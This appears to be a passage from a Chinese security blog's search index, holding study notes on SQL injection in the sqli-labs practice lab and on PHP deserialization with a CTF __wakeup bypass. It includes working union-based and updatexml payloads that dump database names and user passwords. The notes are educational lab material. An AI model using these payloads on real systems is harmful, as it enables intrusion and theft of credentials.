class="hljs-number">1</span>)#</code></pre><p>但是他报错了，<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7147.JPG" srcset="/img/loading.gif" alt="picture"><br>上网看了一下别的大佬的思路，payload是这样的：</p><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=admin&amp;passwd=1' <span class="hljs-keyword">and</span> updatexml(1,concat(0x7e,(select password <span class="hljs-keyword">from</span> (select password <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">'admin'</span>) mingzi ),0x7e),1)</code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7146.JPG" srcset="/img/loading.gif" alt="picture"><br>具体原因，上网查了一下是说：错误的意思是说，不能先select出同一表中的某些值，再同一个SQL语句中update这个表mysql 把 查询子句当做一个临时表，不在当做一个实体表</p>]]></content>
    
    
    <categories>
      
      <category>sql注入</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sql注入笔记1（sqli-labs基础挑战，1-4关）</title>
    <link href="/2019/11/26/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"/>
    <url>/2019/11/26/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>刚刚开始接触sql注入，记点笔记</p><p>首先要判断是什么类型的注入：<br>一.常见的sql注入按照参数类型可分为五种：数字型，字符型还有搜索型注入，内联式，终止式<br>  0x01数字型注入<br>  测试方法：输入id=1 and1=1返回成功，输入id=1 and 1=2，返回失败，则为数字型注入，原因：<br>例如sql语句为：SELECT * FROM test WHERE id=$id 当输入id=1 and1=1,语句变为:SELECT * FROM test WHERE id=1 and1=1<br>这个SQL语句and左边是返回成功的，因为我们是在有这个id的情况下后面加上我们的注入语句，如果这个id不存在，那就没法测试了<br>而在and右边，1=1也是恒成立的，所以整个语句返回的是成功。当然，如果后面改成了1=2的话，因为1=2是不成立的，and语句的判<br>断逻辑是只要有一个不成立，就返回失败，所以1=2最后会返回的是失败</p><p>  0x02字符型注入<br>  测试方法：字符型注入的sql语句一般为SELECT * FROM test WHERE id=’$id’,所以如果输入id=1，返回正确，输入id=1’返回失败，<br>则为字符型注入，此外当你输入id=1’ and ’1’=’1也返回正确，则说明是字符型注入因为当你输入这个时，sql语句变为SELECT * FROM test WHERE id=’1’ and ‘1’=’1’,这语句<br>显然是正确的</p><p> 0x03搜索型注入<br> 测试方法：搜索型的sql语句一般为：SELECT * FROM test WHERE id like ‘%$id%’,如果输入id=1%’ and 1=1 and ‘%’=’，此时sql语句变为SELECT * FROM test WHERE id like<br>‘%1%’ and 1=1 and ‘%’=’%’ 回显是正确的</p><p> 0x04内联式注入<br> 测试方法：内联型注入的sql语句一般为SELECT * FROM admin WHERE username=’$user’ AND password =’$passwd’内联注入是指查询注入SQL代码后，原来的查询仍然全部执行<br> 如果我们提交’ or ‘’=’到username表单中，在password表单中随意输入一个字符串如test，此时的sql语句为SELECT * FROM admin WHERE username=’’ or ‘’=’’ AND password =’$test’由于在<br> sql语句中，AND 的优先级大于or，由于SELECT * FROM admin WHERE username=’’，NULL字段是不存在的，所以第一句是错的，第二句’’=’’ AND password =’$test’，由于test是随便输入的，因此<br> 大概率是不存在test这样的密码的，所以也是错的，因此整个sql语句就返回错误，但是如果我们把’ or ‘’=’提交到password表单中，SQL语句变为SELECT * FROM admin WHERE username=’test’ AND password =’’ or ‘’=’’<br>第一句SELECT * FROM admin WHERE username=’test’ AND password =’’显然是错的，但是第二句’’=’’显然是对的，所以整个sql语句返回正确</p><p>0x05终止注入<br>这主要是个注释的问题，sql语句中常用的注释符有 –  #  ，例如上一个语句中我们提交’ or ‘’=’’ –到username中，这时的SQL语句变为SELECT * FROM admin WHERE username=’’ or ‘’=’’ –’ AND password =’$passwd’<br>此时–后面的语句被注释掉了，所以语句变为SELECT * FROM admin WHERE username=’’ or ‘’=’’，这语句显然返回正确<br>其他终止字符串：– ， #， %23， %00， /*, ’– , ‘)– , ) – , ‘)) –, ))–</p><p>二.接下来是在sqli-labs练习一下</p><p>首先要搞明白，sql注入的流程：<br>1.判断是什么类型注入，有没过滤了关键字，可否绕过</p><p>2.获取数据库用户，版本，当前连接的数据库等信息</p><p>3.获取某个数据库表的信息</p><p>4.获取列信息</p><p>5.最后就获取数据了</p><p>0x01 Less-1<br>首先尝试输入id=1，返回正确，在尝试输入id=1’返回错误，则说明存在字符型注入。<br>接下来猜字段输入id=1’ order by 1#,发现报错了<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B76%20.JPG" srcset="/img/loading.gif" alt="picture"><br>发现它没对我的#进行url编码，于是改为 id=1’ order by 1%23 返回正确，当输入id=1’ order by 4%23时，返回错误，说明只有三个字段，</p><pre><code class="hljs crmsh">payload:<span class="hljs-attr">id=</span><span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> n%<span class="hljs-number">23</span></code></pre><p>然后输入id=1’ union select 1,2,3%23，发现<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B78.JPG" srcset="/img/loading.gif" alt="picture"><br>只返回了第一个查询语句的结果，所以想到把第一个查询语句改为错值，输入id=-1’ union select 1,2,3%23<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B79.JPG" srcset="/img/loading.gif" alt="picture"><br>成功回显2，3，然后输入id=-1’ union select 1,database(),3%23 爆破库名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B710.JPG" srcset="/img/loading.gif" alt="picture"></p><pre><code class="hljs gauss">payload:id=<span class="hljs-number">-1</span>' <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-number">3</span>%<span class="hljs-number">23</span></code></pre><p>得到库名为security，然后输入id=-1’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3%23 查看所有数据库名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B711.JPG" srcset="/img/loading.gif" alt="picture"></p><pre><code class="hljs q">payload:id=<span class="hljs-number">1</span>' <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata),<span class="hljs-number">3</span>%<span class="hljs-number">23</span></code></pre><p>得到所有库名，然后试着查看security下的表名 输入id=-1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3%23 查看所有表名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B712.JPG" srcset="/img/loading.gif" alt="picture"></p><pre><code class="hljs cs">payload:id=<span class="hljs-number">-1'</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">group_concat</span>(<span class="hljs-params">table_name</span>)<span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">'security'</span>),<span class="hljs-number">3</span>%<span class="hljs-number">23</span></code></pre><p>得到security库中的所有表名，发现了users这张表，于是输入id=-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’),3%23 查看users表下的列名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B713.JPG" srcset="/img/loading.gif" alt="picture"></p><pre><code class="hljs cs">payload:id=<span class="hljs-number">-1'</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">group_concat</span>(<span class="hljs-params">column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">'users'</span>),<span class="hljs-number">3</span>%<span class="hljs-number">23</span></code></pre><p>得到users表下的列名，最后爆破用户名和密码，输入id=-1’ union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users)%23<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B714.JPG" srcset="/img/loading.gif" alt="picture"><br>得到了所有用户名和密码！！</p><pre><code class="hljs sql">payload:id=-1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> security.users) ,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username) <span class="hljs-keyword">from</span> security.users)%<span class="hljs-number">23</span></code></pre><p>相关函数解释：<br>group_concat():连接一个组的所有字符串 以逗号分隔每一条数据<br>类似的有：<br>concat(str1,str2,…):没有分隔符 连接字符串如有任何一个参数为NULL则结果为 NULL,可以有一个或多个参数</p><p>concat_ws(separator,str1,str2,…):含有分隔符 连接字符串<br>information_schema是什么：<br>mysql中的information_schema 结构用来存储数据库系统信息<br>information_schema 结构中这几个表存储的信息，在sql注入中可以用到的几个表：　<br>schemata：存储数据库名  schema_name：表示数据库名称<br>table：存储表名的      table_schema:表示所属数据库名称 table_name:表示表的名称<br>columns：存储字段名的    table_schema：表示所属数据库的名称 table_name:表示所属表的名称 column_name:表示字段名<br>所以</p><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">SCHEMA_NAME</span>) <span class="hljs-keyword">from</span> information_schema.schemata</code></pre><p>相当于把所有数据库的名称从存储数据库名的表中选出来，就相当于列出了库名，以此类推</p><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">'xxx'</span></code></pre><p>从xxx数据库中列出所有表名</p><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">'xxx'</span></code></pre><p>从xxx表中列出列名</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(xxx) <span class="hljs-keyword">from</span> xxx.xxx) ,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(yyy) <span class="hljs-keyword">from</span> xxx.xxx</code></pre><p>从xxx库的xxx表中列出xxx和yyy两个列中的字段值<br>其他在sql注入中常用的函数:<br>substr(x,y,z):对字符串x进行截取，y开始的位置，截取z个字符(空白也算字符)<br>left(x,y):返回最左边的y个字符的字符串x，或NULL如果任何参数是NULL<br>databse():返回当前数据库名称<br>version()：MySQL 版本<br>user()：数据库用户名<br>hex():字符串/10进制——16进制<br>ascii()：字符串——ASCII码<br>CHAR（）：ASCII——字符串<br>length（）：获取一个字符串的长度<br>rand():返回一个随机浮点数x，x大于0小于1<br>ELT(n,str1,str2,str3….):返回第n个字符串</p><p>0x02 Less-2<br>输入id=1 and 1=1,返回正确，显然是数字型注入，那就不需要考虑引号闭合问题，之后就跟第一关类似，不考虑引号和终止符就行了</p><p>0x03 Less-3,4和第二关一样，只是要用’)去闭合，例如输入id=-1’) union select 1,(select group_concat(schema_name) from information_schema.schemata),3%23,去查看security下所有的表名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B715.JPG" srcset="/img/loading.gif" alt="picture"><br>后面和前两关一样的操作，第四关是要有”)去闭合</p>]]></content>
    
    
    <categories>
      
      <category>sql注入</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于php反序列化与魔术方法</title>
    <link href="/2019/11/18/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2019/11/18/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>一，何为php序列化与反序列化：<br>序列化（串行化）：是将变量转换为可保存或传输的字符串的过程；反序列化（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用<br>。这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。<br>其次要知道两个函数：<br>serialize()     //将一个对象转换成一个字符串<br>unserialize()   //将字符串还原成一个对象<br>示例：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>     <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span>    </span>&#123;        <span class="hljs-keyword">private</span> $flag = <span class="hljs-string">"flag&#123;123&#125;"</span>;        <span class="hljs-keyword">public</span> $a = <span class="hljs-string">"aaa"</span>;        <span class="hljs-keyword">static</span> $b = <span class="hljs-string">"bbb"</span>;    &#125;    $test = <span class="hljs-keyword">new</span> test;    $a = serialize($test);    $b=unserialize($a);print_r($a);print_r($b); <span class="hljs-meta">?&gt;</span></code></pre><p>出现：<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B71%20(2).JPG" srcset="/img/loading.gif" alt="Aaron Swartz"><br>O:4:”test”指Object(对象) 4个字符:test<br>:2对象属性个数为2<br>{}中为属性字符数：属性值<br>注意：可以看到testflag的长度为8，序列化中却显示长度为10。这是因为它是private属性，它会在两侧加入空字节。<br>所以在传入序列化字符串进行反序列化时需要注意补齐两个空字节。<br>二，PHP魔术方法：PHP中把以两个下划线__开头的方法称为魔术方法 常见魔术方法包括：</p><p>__construct()，类的构造函数(反序列化过程不调用)</p><p>__destruct()，类的析构函数(反序列化形成的类在销毁时也会调用)</p><p>__call()，在对象中调用一个不可访问方法时调用</p><p>__callStatic()，用静态方式中调用一个不可访问方法时调用</p><p>__get()，获得一个类的成员变量时调用</p><p>__set()，设置一个类的成员变量时调用</p><p>__isset()，当对不可访问属性调用isset()或empty()时调用</p><p>__unset()，当对不可访问属性调用unset()时被调用。</p><p>__sleep()，执行serialize()时，先会调用这个函数</p><p>__wakeup()，执行unserialize()时，先会调用这个函数</p><p>__toString()，类被当成字符串时的回应方法</p><p>__invoke()，调用函数的方式调用一个对象时的回应方法</p><p>__set_state()，调用var_export()导出类时，此静态方法会被调用。</p><p>__clone()，当对象复制完成时调用</p><p>__autoload()，尝试加载未定义的类</p><p>常见魔术方法的简单介绍：<br>__sleep（常用于序列化）<br>在使用 serialize() 函数时，程序会检查类中是否存在一个 __sleep() 魔术方法。如果存在，则该方法会先被调用，然后再执行序列化操作。</p><p>__wakeup（常用于反序列化）<br>在使用 unserialize() 时，会检查是否存在一个 __wakeup() 魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源。</p><p>__toString<br>__toString() 方法用于定义一个类被当成字符串时该如何处理。</p><p><strong>invoke<br>当尝试以调用函数的方式调用一个对象时，</strong>invoke() 方法会被自动调用。(本特性只在 PHP 5.3.0 及以上版本有效。)</p><p>__construct<br>具有 __construct 函数的类会在每次创建新对象时先调用此方法，适合在使用对象之前做一些初始化工作。</p><p>__destruct<br>__destruct 函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行</p><p>以下是用于PHP重载的魔术方法（可参考PHP官网示例<a href="https://www.php.net/manual/zh/language.oop5.overloading.php）：" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.overloading.php）：</a><br><strong>set<br>给不可访问属性赋值时，</strong>set() 会被调用。</p><p><strong>get<br>读取不可访问属性的值时，</strong>get() 会被调用。</p><p><strong>isset<br>对不可访问属性调用 isset() 或 empty() 时，</strong>isset() 会被调用。</p><p><strong>unset<br>对不可访问属性调用 unset() 时，</strong>unset() 会被调用。</p><p><strong>call<br>在对象中调用一个不可访问方法时，</strong>call() 会被调用。<br><strong>callStatic<br>在静态上下文中调用一个不可访问方法时，</strong>callStatic() 会被调用。<br>例题1：攻防世界上一道简单的反序列化：<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B72.JPG" srcset="/img/loading.gif" alt="picture"><br>这是一个简单的反序列化，但是由于反序列化时会先执行<br>——wakeup（）函数，所以要想办法绕过它<br><strong>wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过</strong>wakeup的执行<br>所以 O:4:“xctf”:1:{s:4:“flag”;s:3:“111”;}把1改为大于1的数就行了<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B73.JPG" srcset="/img/loading.gif" alt="picture"></p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
